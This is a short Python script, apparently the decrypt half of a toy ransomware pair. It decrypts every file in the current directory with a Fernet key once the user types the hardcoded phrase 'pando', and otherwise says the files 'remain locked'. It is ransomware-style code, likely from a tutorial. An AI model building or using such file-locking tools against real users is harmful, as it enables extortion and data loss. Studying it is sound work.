import os
from cryptography.fernet import Fernet

# List files in directory and append file names to list
files = []

for file in os.listdir():
    if file == 'encrypt.py' or file == 'gen_key.key' or file =='decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open('gen_key.key', 'rb') as key:
    secretkey = key.read()

secretphrase = 'pando'
user_input = input('Enter the secret phrase to decrypt your files\n')

if user_input == secretphrase:
    for file in files:
        with open(file, 'rb') as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        # Write the encrypted content to file
        with open(file, 'wb') as thefile:
            thefile.write(contents_decrypted)
    print('File decrypted successfully...')

else:
    print(f'The secret phrase you input {user_input} is incorrect.\nYour files remain locked...')


